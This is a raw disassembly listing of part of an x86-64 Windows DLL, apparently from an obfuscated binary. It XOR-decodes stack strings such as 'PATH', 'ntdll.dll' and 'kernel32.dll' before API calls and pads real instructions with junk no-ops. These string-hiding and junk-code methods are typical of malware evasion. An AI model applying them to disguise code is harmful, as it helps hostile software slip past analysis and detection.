   1800032d8:	83 f0 7b             	xor    $0x7b,%eax
   1800032db:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1800032e0:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800032e4:	83 f0 02             	xor    $0x2,%eax
   1800032e7:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   1800032ec:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800032f0:	83 f0 64             	xor    $0x64,%eax
   1800032f3:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   1800032f8:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800032fc:	83 f0 6f             	xor    $0x6f,%eax
   1800032ff:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   180003304:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003308:	83 f0 51             	xor    $0x51,%eax
   18000330b:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   180003310:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003314:	83 f0 56             	xor    $0x56,%eax
   180003317:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   18000331c:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003320:	83 f0 5c             	xor    $0x5c,%eax
   180003323:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   180003328:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000332c:	83 f0 57             	xor    $0x57,%eax
   18000332f:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   180003334:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003338:	83 f0 4f             	xor    $0x4f,%eax
   18000333b:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   180003340:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003344:	83 f0 4b             	xor    $0x4b,%eax
   180003347:	66 89 44 24 72       	mov    %ax,0x72(%rsp)
   18000334c:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003350:	83 f0 64             	xor    $0x64,%eax
   180003353:	66 89 44 24 74       	mov    %ax,0x74(%rsp)
   180003358:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000335c:	83 f0 6b             	xor    $0x6b,%eax
   18000335f:	66 89 44 24 76       	mov    %ax,0x76(%rsp)
   180003364:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003368:	83 f0 41             	xor    $0x41,%eax
   18000336b:	66 89 44 24 78       	mov    %ax,0x78(%rsp)
   180003370:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003374:	83 f0 4b             	xor    $0x4b,%eax
   180003377:	66 89 44 24 7a       	mov    %ax,0x7a(%rsp)
   18000337c:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003380:	83 f0 4c             	xor    $0x4c,%eax
   180003383:	66 89 44 24 7c       	mov    %ax,0x7c(%rsp)
   180003388:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000338c:	83 f0 5d             	xor    $0x5d,%eax
   18000338f:	66 89 44 24 7e       	mov    %ax,0x7e(%rsp)
   180003394:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003398:	83 f0 55             	xor    $0x55,%eax
   18000339b:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   1800033a2:	00 
   1800033a3:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800033a7:	83 f0 0b             	xor    $0xb,%eax
   1800033aa:	66 89 84 24 82 00 00 	mov    %ax,0x82(%rsp)
   1800033b1:	00 
   1800033b2:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800033b6:	83 f0 0a             	xor    $0xa,%eax
   1800033b9:	66 89 84 24 84 00 00 	mov    %ax,0x84(%rsp)
   1800033c0:	00 
   1800033c1:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800033c5:	83 f0 64             	xor    $0x64,%eax
   1800033c8:	66 89 84 24 86 00 00 	mov    %ax,0x86(%rsp)
   1800033cf:	00 
   1800033d0:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800033d4:	83 f0 53             	xor    $0x53,%eax
   1800033d7:	66 89 84 24 88 00 00 	mov    %ax,0x88(%rsp)
   1800033de:	00 
   1800033df:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800033e3:	83 f0 5d             	xor    $0x5d,%eax
   1800033e6:	66 89 84 24 8a 00 00 	mov    %ax,0x8a(%rsp)
   1800033ed:	00 
   1800033ee:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800033f2:	83 f0 4a             	xor    $0x4a,%eax
   1800033f5:	66 89 84 24 8c 00 00 	mov    %ax,0x8c(%rsp)
   1800033fc:	00 
   1800033fd:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003401:	83 f0 56             	xor    $0x56,%eax
   180003404:	66 89 84 24 8e 00 00 	mov    %ax,0x8e(%rsp)
   18000340b:	00 
   18000340c:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003410:	83 f0 5d             	xor    $0x5d,%eax
   180003413:	66 89 84 24 90 00 00 	mov    %ax,0x90(%rsp)
   18000341a:	00 
   18000341b:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000341f:	83 f0 54             	xor    $0x54,%eax
   180003422:	66 89 84 24 92 00 00 	mov    %ax,0x92(%rsp)
   180003429:	00 
   18000342a:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000342e:	83 f0 0b             	xor    $0xb,%eax
   180003431:	66 89 84 24 94 00 00 	mov    %ax,0x94(%rsp)
   180003438:	00 
   180003439:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000343d:	83 f0 0a             	xor    $0xa,%eax
   180003440:	66 89 84 24 96 00 00 	mov    %ax,0x96(%rsp)
   180003447:	00 
   180003448:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000344c:	83 f0 16             	xor    $0x16,%eax
   18000344f:	66 89 84 24 98 00 00 	mov    %ax,0x98(%rsp)
   180003456:	00 
   180003457:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000345b:	83 f0 5c             	xor    $0x5c,%eax
   18000345e:	66 89 84 24 9a 00 00 	mov    %ax,0x9a(%rsp)
   180003465:	00 
   180003466:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000346a:	83 f0 54             	xor    $0x54,%eax
   18000346d:	66 89 84 24 9c 00 00 	mov    %ax,0x9c(%rsp)
   180003474:	00 
   180003475:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003479:	83 f0 54             	xor    $0x54,%eax
   18000347c:	66 89 84 24 9e 00 00 	mov    %ax,0x9e(%rsp)
   180003483:	00 
   180003484:	66 c7 84 24 a0 00 00 	movw   $0x0,0xa0(%rsp)
   18000348b:	00 00 00 
   18000348e:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   180003493:	48 89 f1             	mov    %rsi,%rcx
   180003496:	ff 15 44 2c 02 00    	call   *0x22c44(%rip)        # 0x1800260e0
   18000349c:	41 54                	push   %r12
   18000349e:	41 57                	push   %r15
   1800034a0:	41 5f                	pop    %r15
   1800034a2:	41 5c                	pop    %r12
   1800034a4:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800034a9:	ff 15 59 2d 02 00    	call   *0x22d59(%rip)        # 0x180026208
   1800034af:	90                   	nop
   1800034b0:	90                   	nop
   1800034b1:	90                   	nop
   1800034b2:	90                   	nop
   1800034b3:	31 c9                	xor    %ecx,%ecx
   1800034b5:	ff 15 7d 2b 02 00    	call   *0x22b7d(%rip)        # 0x180026038
   1800034bb:	83 f8 ff             	cmp    $0xffffffff,%eax
   1800034be:	74 08                	je     0x1800034c8
   1800034c0:	89 c1                	mov    %eax,%ecx
   1800034c2:	ff 15 78 2b 02 00    	call   *0x22b78(%rip)        # 0x180026040
   1800034c8:	48 89 ff             	mov    %rdi,%rdi
   1800034cb:	c7 44 24 60 b9 09 e4 	movl   $0xe409b9,0x60(%rsp)
   1800034d2:	00 
   1800034d3:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800034d7:	41 51                	push   %r9
   1800034d9:	52                   	push   %rdx
   1800034da:	5a                   	pop    %rdx
   1800034db:	41 59                	pop    %r9
   1800034dd:	4d 89 db             	mov    %r11,%r11
   1800034e0:	48 8d 36             	lea    (%rsi),%rsi
   1800034e3:	4d 89 c0             	mov    %r8,%r8
   1800034e6:	4d 89 f6             	mov    %r14,%r14
   1800034e9:	48 87 f6             	xchg   %rsi,%rsi
   1800034ec:	4d 8d 3f             	lea    (%r15),%r15
   1800034ef:	4d 8d 00             	lea    (%r8),%r8
   1800034f2:	b9 d5 02 00 00       	mov    $0x2d5,%ecx
   1800034f7:	e8 b4 ec ff ff       	call   0x1800021b0
   1800034fc:	90                   	nop
   1800034fd:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003501:	90                   	nop
   180003502:	4d 8d 09             	lea    (%r9),%r9
   180003505:	90                   	nop
   180003506:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003509:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   18000350e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003513:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   18000351a:	00 
   18000351b:	4c 8d 05 54 f3 01 00 	lea    0x1f354(%rip),%r8        # 0x180022876
   180003522:	31 c9                	xor    %ecx,%ecx
   180003524:	31 d2                	xor    %edx,%edx
   180003526:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000352c:	ff 15 9e 2d 02 00    	call   *0x22d9e(%rip)        # 0x1800262d0
   180003532:	4d 87 c0             	xchg   %r8,%r8
   180003535:	4d 87 c9             	xchg   %r9,%r9
   180003538:	4d 8d 36             	lea    (%r14),%r14
   18000353b:	4d 89 db             	mov    %r11,%r11
   18000353e:	4d 89 d2             	mov    %r10,%r10
   180003541:	48 8d 1b             	lea    (%rbx),%rbx
   180003544:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003548:	e8 c3 ec ff ff       	call   0x180002210
   18000354d:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   180003552:	48 89 f1             	mov    %rsi,%rcx
   180003555:	ff 15 f5 2c 02 00    	call   *0x22cf5(%rip)        # 0x180026250
   18000355b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003560:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180003567:	00 
   180003568:	4c 8d 05 13 f3 01 00 	lea    0x1f313(%rip),%r8        # 0x180022882
   18000356f:	b9 00 04 00 00       	mov    $0x400,%ecx
   180003574:	ba 00 01 00 00       	mov    $0x100,%edx
   180003579:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000357f:	ff 15 9b 2c 02 00    	call   *0x22c9b(%rip)        # 0x180026220
   180003585:	e8 16 e2 ff ff       	call   0x1800017a0
   18000358a:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   18000358e:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180003592:	48 87 db             	xchg   %rbx,%rbx
   180003595:	48 87 e4             	xchg   %rsp,%rsp
   180003598:	c7 44 24 60 93 97 e6 	movl   $0xe69793,0x60(%rsp)
   18000359f:	00 
   1800035a0:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800035a4:	48 89 e4             	mov    %rsp,%rsp
   1800035a7:	48 8d 09             	lea    (%rcx),%rcx
   1800035aa:	4d 87 d2             	xchg   %r10,%r10
   1800035ad:	b9 06 02 00 00       	mov    $0x206,%ecx
   1800035b2:	e8 e9 e7 ff ff       	call   0x180001da0
   1800035b7:	ff 15 c3 2a 02 00    	call   *0x22ac3(%rip)        # 0x180026080
   1800035bd:	48 87 db             	xchg   %rbx,%rbx
   1800035c0:	c7 44 24 58 58 00 00 	movl   $0x58,0x58(%rsp)
   1800035c7:	00 
   1800035c8:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1800035cc:	83 f0 08             	xor    $0x8,%eax
   1800035cf:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   1800035d4:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1800035d8:	83 f0 19             	xor    $0x19,%eax
   1800035db:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   1800035e0:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1800035e4:	83 f0 0c             	xor    $0xc,%eax
   1800035e7:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   1800035ec:	8b 44 24 58          	mov    0x58(%rsp),%eax
   1800035f0:	83 f0 10             	xor    $0x10,%eax
   1800035f3:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   1800035f8:	66 c7 44 24 54 00 00 	movw   $0x0,0x54(%rsp)
   1800035ff:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   180003604:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180003609:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   18000360f:	ff 15 c3 2a 02 00    	call   *0x22ac3(%rip)        # 0x1800260d8
   180003615:	52                   	push   %rdx
   180003616:	5a                   	pop    %rdx
   180003617:	48 89 c9             	mov    %rcx,%rcx
   18000361a:	4d 8d 00             	lea    (%r8),%r8
   18000361d:	4d 87 c0             	xchg   %r8,%r8
   180003620:	4d 87 ff             	xchg   %r15,%r15
   180003623:	c7 44 24 4c a7 00 00 	movl   $0xa7,0x4c(%rsp)
   18000362a:	00 
   18000362b:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000362f:	35 c9 00 00 00       	xor    $0xc9,%eax
   180003634:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   180003639:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000363d:	35 d3 00 00 00       	xor    $0xd3,%eax
   180003642:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   180003647:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000364b:	35 c3 00 00 00       	xor    $0xc3,%eax
   180003650:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   180003655:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003659:	35 cb 00 00 00       	xor    $0xcb,%eax
   18000365e:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   180003663:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003667:	35 cb 00 00 00       	xor    $0xcb,%eax
   18000366c:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   180003671:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003675:	35 89 00 00 00       	xor    $0x89,%eax
   18000367a:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   18000367f:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003683:	35 c3 00 00 00       	xor    $0xc3,%eax
   180003688:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   18000368d:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003691:	35 cb 00 00 00       	xor    $0xcb,%eax
   180003696:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   18000369b:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000369f:	35 cb 00 00 00       	xor    $0xcb,%eax
   1800036a4:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   1800036a9:	66 c7 44 24 72 00 00 	movw   $0x0,0x72(%rsp)
   1800036b0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800036b5:	ff 15 75 2a 02 00    	call   *0x22a75(%rip)        # 0x180026130
   1800036bb:	4d 89 e4             	mov    %r12,%r12
   1800036be:	48 89 e4             	mov    %rsp,%rsp
   1800036c1:	48 89 ed             	mov    %rbp,%rbp
   1800036c4:	48 87 db             	xchg   %rbx,%rbx
   1800036c7:	48 87 db             	xchg   %rbx,%rbx
   1800036ca:	e8 71 ed ff ff       	call   0x180002440
   1800036cf:	57                   	push   %rdi
   1800036d0:	5f                   	pop    %rdi
   1800036d1:	c7 44 24 60 db 86 9f 	movl   $0x9f86db,0x60(%rsp)
   1800036d8:	00 
   1800036d9:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800036dd:	48 89 c0             	mov    %rax,%rax
   1800036e0:	48 89 e4             	mov    %rsp,%rsp
   1800036e3:	48 89 f6             	mov    %rsi,%rsi
   1800036e6:	4d 87 c9             	xchg   %r9,%r9
   1800036e9:	48 89 ff             	mov    %rdi,%rdi
   1800036ec:	48 89 d2             	mov    %rdx,%rdx
   1800036ef:	e8 ac e0 ff ff       	call   0x1800017a0
   1800036f4:	41 56                	push   %r14
   1800036f6:	4d 87 ed             	xchg   %r13,%r13
   1800036f9:	41 5e                	pop    %r14
   1800036fb:	31 c0                	xor    %eax,%eax
   1800036fd:	48 81 c4 70 02 00 00 	add    $0x270,%rsp
   180003704:	5e                   	pop    %rsi
   180003705:	c3                   	ret
   180003706:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   18000370d:	00 00 00 
   180003710:	56                   	push   %rsi
   180003711:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   180003718:	b9 e2 02 00 00       	mov    $0x2e2,%ecx
   18000371d:	e8 ee de ff ff       	call   0x180001610
   180003722:	31 c9                	xor    %ecx,%ecx
   180003724:	ff 15 46 2b 02 00    	call   *0x22b46(%rip)        # 0x180026270
   18000372a:	50                   	push   %rax
   18000372b:	4d 87 f6             	xchg   %r14,%r14
   18000372e:	4d 8d 36             	lea    (%r14),%r14
   180003731:	58                   	pop    %rax
   180003732:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180003737:	ff 15 43 2a 02 00    	call   *0x22a43(%rip)        # 0x180026180
   18000373d:	56                   	push   %rsi
   18000373e:	4d 87 f6             	xchg   %r14,%r14
   180003741:	48 89 f6             	mov    %rsi,%rsi
   180003744:	5e                   	pop    %rsi
   180003745:	ff 15 75 29 02 00    	call   *0x22975(%rip)        # 0x1800260c0
   18000374b:	50                   	push   %rax
   18000374c:	58                   	pop    %rax
   18000374d:	51                   	push   %rcx
   18000374e:	41 54                	push   %r12
   180003750:	41 5c                	pop    %r12
   180003752:	59                   	pop    %rcx
   180003753:	c7 44 24 40 08 02 93 	movl   $0x930208,0x40(%rsp)
   18000375a:	00 
   18000375b:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000375f:	48 87 ed             	xchg   %rbp,%rbp
   180003762:	41 53                	push   %r11
   180003764:	4d 89 ff             	mov    %r15,%r15
   180003767:	41 5b                	pop    %r11
   180003769:	52                   	push   %rdx
   18000376a:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000376e:	5a                   	pop    %rdx
   18000376f:	b9 6a 02 00 00       	mov    $0x26a,%ecx
   180003774:	e8 47 e2 ff ff       	call   0x1800019c0
   180003779:	41 54                	push   %r12
   18000377b:	41 50                	push   %r8
   18000377d:	41 58                	pop    %r8
   18000377f:	41 5c                	pop    %r12
   180003781:	90                   	nop
   180003782:	4d 89 ff             	mov    %r15,%r15
   180003785:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000378a:	ff 15 a8 29 02 00    	call   *0x229a8(%rip)        # 0x180026138
   180003790:	90                   	nop
   180003791:	4d 89 d2             	mov    %r10,%r10
   180003794:	90                   	nop
   180003795:	48 8b 35 94 29 02 00 	mov    0x22994(%rip),%rsi        # 0x180026130
   18000379c:	31 c9                	xor    %ecx,%ecx
   18000379e:	ff d6                	call   *%rsi
   1800037a0:	4d 87 c9             	xchg   %r9,%r9
   1800037a3:	41 51                	push   %r9
   1800037a5:	41 52                	push   %r10
   1800037a7:	41 5a                	pop    %r10
   1800037a9:	41 59                	pop    %r9
   1800037ab:	48 89 c9             	mov    %rcx,%rcx
   1800037ae:	4d 8d 1b             	lea    (%r11),%r11
   1800037b1:	4d 8d 36             	lea    (%r14),%r14
   1800037b4:	c7 44 24 3c 0a 00 00 	movl   $0xa,0x3c(%rsp)
   1800037bb:	00 
   1800037bc:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800037c0:	83 f0 61             	xor    $0x61,%eax
   1800037c3:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800037c8:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800037cc:	83 f0 6f             	xor    $0x6f,%eax
   1800037cf:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800037d4:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800037d8:	83 f0 78             	xor    $0x78,%eax
   1800037db:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1800037e0:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800037e4:	83 f0 64             	xor    $0x64,%eax
   1800037e7:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   1800037ec:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800037f0:	83 f0 6f             	xor    $0x6f,%eax
   1800037f3:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   1800037f8:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800037fc:	83 f0 66             	xor    $0x66,%eax
   1800037ff:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   180003804:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003808:	83 f0 39             	xor    $0x39,%eax
   18000380b:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   180003810:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003814:	83 f0 38             	xor    $0x38,%eax
   180003817:	66 89 44 24 4e       	mov    %ax,0x4e(%rsp)
   18000381c:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003820:	83 f0 24             	xor    $0x24,%eax
   180003823:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   180003828:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000382c:	83 f0 6e             	xor    $0x6e,%eax
   18000382f:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180003834:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003838:	83 f0 66             	xor    $0x66,%eax
   18000383b:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   180003840:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180003844:	83 f0 66             	xor    $0x66,%eax
   180003847:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   18000384c:	66 c7 44 24 58 00 00 	movw   $0x0,0x58(%rsp)
   180003853:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180003858:	ff d6                	call   *%rsi
   18000385a:	4d 89 ed             	mov    %r13,%r13
   18000385d:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003861:	4d 89 db             	mov    %r11,%r11
   180003864:	e8 c7 d9 ff ff       	call   0x180001230
   180003869:	c7 44 24 40 2a 9e 93 	movl   $0x939e2a,0x40(%rsp)
   180003870:	00 
   180003871:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180003875:	50                   	push   %rax
   180003876:	41 51                	push   %r9
   180003878:	41 59                	pop    %r9
   18000387a:	58                   	pop    %rax
   18000387b:	50                   	push   %rax
   18000387c:	4d 87 d2             	xchg   %r10,%r10
   18000387f:	58                   	pop    %rax
   180003880:	e8 5b e1 ff ff       	call   0x1800019e0
   180003885:	52                   	push   %rdx
   180003886:	53                   	push   %rbx
   180003887:	5b                   	pop    %rbx
   180003888:	5a                   	pop    %rdx
   180003889:	51                   	push   %rcx
   18000388a:	48 87 e4             	xchg   %rsp,%rsp
   18000388d:	59                   	pop    %rcx
   18000388e:	e8 7d e9 ff ff       	call   0x180002210
   180003893:	b9 26 02 00 00       	mov    $0x226,%ecx
   180003898:	e8 73 d9 ff ff       	call   0x180001210
   18000389d:	ff 15 cd 27 02 00    	call   *0x227cd(%rip)        # 0x180026070
   1800038a3:	48 8d 05 d0 ef 01 00 	lea    0x1efd0(%rip),%rax        # 0x18002287a
   1800038aa:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800038af:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1800038b6:	00 
   1800038b7:	4c 8d 05 c0 ef 01 00 	lea    0x1efc0(%rip),%r8        # 0x18002287e
   1800038be:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   1800038c3:	31 d2                	xor    %edx,%edx
   1800038c5:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800038cb:	ff 15 0f 27 02 00    	call   *0x2270f(%rip)        # 0x180025fe0
   1800038d1:	55                   	push   %rbp
   1800038d2:	5d                   	pop    %rbp
   1800038d3:	56                   	push   %rsi
   1800038d4:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   1800038d8:	5e                   	pop    %rsi
   1800038d9:	e8 22 e5 ff ff       	call   0x180001e00
   1800038de:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1800038e3:	ff 15 77 28 02 00    	call   *0x22877(%rip)        # 0x180026160
   1800038e9:	48 89 ff             	mov    %rdi,%rdi
   1800038ec:	4d 89 db             	mov    %r11,%r11
   1800038ef:	48 87 f6             	xchg   %rsi,%rsi
   1800038f2:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1800038f7:	b9 00 04 00 00       	mov    $0x400,%ecx
   1800038fc:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180003901:	41 b9 55 00 00 00    	mov    $0x55,%r9d
   180003907:	ff 15 fb 27 02 00    	call   *0x227fb(%rip)        # 0x180026108
   18000390d:	48 87 f6             	xchg   %rsi,%rsi
   180003910:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003914:	48 8d 00             	lea    (%rax),%rax
   180003917:	4d 87 db             	xchg   %r11,%r11
   18000391a:	e8 61 f5 ff ff       	call   0x180002e80
   18000391f:	90                   	nop
   180003920:	90                   	nop
   180003921:	4d 87 e4             	xchg   %r12,%r12
   180003924:	e8 c7 f3 ff ff       	call   0x180002cf0
   180003929:	c7 44 24 40 09 b4 0f 	movl   $0xfb409,0x40(%rsp)
   180003930:	00 
   180003931:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180003935:	4d 89 db             	mov    %r11,%r11
   180003938:	90                   	nop
   180003939:	48 89 c0             	mov    %rax,%rax
   18000393c:	90                   	nop
   18000393d:	e8 ce db ff ff       	call   0x180001510
   180003942:	41 50                	push   %r8
   180003944:	41 58                	pop    %r8
   180003946:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   18000394b:	48 89 f1             	mov    %rsi,%rcx
   18000394e:	ba 04 01 00 00       	mov    $0x104,%edx
   180003953:	ff 15 17 28 02 00    	call   *0x22817(%rip)        # 0x180026170
   180003959:	48 89 f1             	mov    %rsi,%rcx
   18000395c:	ff 15 7e 27 02 00    	call   *0x2277e(%rip)        # 0x1800260e0
   180003962:	90                   	nop
   180003963:	48 81 c4 50 02 00 00 	add    $0x250,%rsp
   18000396a:	5e                   	pop    %rsi
   18000396b:	c3                   	ret
   18000396c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003970:	48 83 ec 38          	sub    $0x38,%rsp
   180003974:	c7 44 24 2c 5b 00 00 	movl   $0x5b,0x2c(%rsp)
   18000397b:	00 
   18000397c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003980:	4d 89 f6             	mov    %r14,%r14
   180003983:	4d 8d 1b             	lea    (%r11),%r11
   180003986:	48 89 d2             	mov    %rdx,%rdx
   180003989:	90                   	nop
   18000398a:	48 8d 1b             	lea    (%rbx),%rbx
   18000398d:	b9 da 01 00 00       	mov    $0x1da,%ecx
   180003992:	e8 29 df ff ff       	call   0x1800018c0
   180003997:	4d 8d 3f             	lea    (%r15),%r15
   18000399a:	4d 87 ed             	xchg   %r13,%r13
   18000399d:	48 89 e4             	mov    %rsp,%rsp
   1800039a0:	48 8d 0d cd ee 01 00 	lea    0x1eecd(%rip),%rcx        # 0x180022874
   1800039a7:	ff 15 9b 28 02 00    	call   *0x2289b(%rip)        # 0x180026248
   1800039ad:	4d 89 e4             	mov    %r12,%r12
   1800039b0:	ff 15 02 27 02 00    	call   *0x22702(%rip)        # 0x1800260b8
   1800039b6:	48 89 c1             	mov    %rax,%rcx
   1800039b9:	ff 15 d1 27 02 00    	call   *0x227d1(%rip)        # 0x180026190
   1800039bf:	48 8d 36             	lea    (%rsi),%rsi
   1800039c2:	4d 8d 00             	lea    (%r8),%r8
   1800039c5:	4d 8d 24 24          	lea    (%r12),%r12
   1800039c9:	4d 89 f6             	mov    %r14,%r14
   1800039cc:	e8 cf dd ff ff       	call   0x1800017a0
   1800039d1:	ff 15 c1 27 02 00    	call   *0x227c1(%rip)        # 0x180026198
   1800039d7:	48 8d 3f             	lea    (%rdi),%rdi
   1800039da:	4d 8d 24 24          	lea    (%r12),%r12
   1800039de:	90                   	nop
   1800039df:	4d 89 e4             	mov    %r12,%r12
   1800039e2:	4d 87 db             	xchg   %r11,%r11
   1800039e5:	48 89 c9             	mov    %rcx,%rcx
   1800039e8:	4d 8d 00             	lea    (%r8),%r8
   1800039eb:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1800039f0:	31 c9                	xor    %ecx,%ecx
   1800039f2:	31 d2                	xor    %edx,%edx
   1800039f4:	ff 15 2e 27 02 00    	call   *0x2272e(%rip)        # 0x180026128
   1800039fa:	48 89 d2             	mov    %rdx,%rdx
   1800039fd:	48 8d 1b             	lea    (%rbx),%rbx
   180003a00:	c7 44 24 30 50 2e f1 	movl   $0xf12e50,0x30(%rsp)
   180003a07:	00 
   180003a08:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003a0c:	53                   	push   %rbx
   180003a0d:	4d 89 e4             	mov    %r12,%r12
   180003a10:	5b                   	pop    %rbx
   180003a11:	48 8d 09             	lea    (%rcx),%rcx
   180003a14:	90                   	nop
   180003a15:	e8 26 ea ff ff       	call   0x180002440
   180003a1a:	4d 87 f6             	xchg   %r14,%r14
   180003a1d:	48 89 c0             	mov    %rax,%rax
